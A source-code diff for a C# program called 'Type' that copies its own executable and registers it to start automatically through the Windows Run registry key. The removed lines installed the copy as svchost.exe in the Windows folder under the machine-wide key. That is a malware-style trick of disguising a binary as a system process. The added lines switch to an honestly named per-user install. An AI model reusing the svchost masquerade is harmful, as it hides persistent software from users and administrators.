@@ -12,12 +12,13 @@ namespace Type
         private const char QUOT = '\"';
         private const string KEY = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
         private const string KEY_VALUE = "type-bin";
-        private const Environment.SpecialFolder EMBED_LOC = Environment.SpecialFolder.Windows;
-        private const string EXE_NAME = @"\svchost.exe";
+        private const Environment.SpecialFolder EMBED_LOC = Environment.SpecialFolder.LocalApplicationData;
+        private const string EMBED_SUBFOLDER = @"\Type-App";
+        private const string EXE_NAME = @"\type.exe";
 
         private static bool IsInstalled()
         {
-            RegistryKey key = Registry.LocalMachine.OpenSubKey(KEY, true);
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(KEY, true);
             string path;
             if ((path = (string)key.GetValue(KEY_VALUE)) == null)
             {
@@ -56,11 +57,21 @@ namespace Type
             string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
             FileInfo applicationInfo = new FileInfo(me);
 
-            string dest = Environment.GetFolderPath(EMBED_LOC);
+            string dest = (Environment.GetFolderPath(EMBED_LOC) + EMBED_SUBFOLDER);
+            TouchDirectory(dest);
+
             string name = EXE_NAME;
             string target = (dest + name);
 
             Install(me, target);
+        }
+
+        private static void TouchDirectory(string dest)
+        {
+            if (!Directory.Exists(dest))
+            {
+                Directory.CreateDirectory(dest);
+            }
         }
 
         private static void Install(string me, string target)
@@ -71,7 +82,7 @@ namespace Type
 
         private static void SetRegistryAutoStart(string target)
         {
-            RegistryKey key = Registry.LocalMachine.OpenSubKey(KEY, true);
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(KEY, true);
             key.SetValue(KEY_VALUE, Quote(target));
         }
 
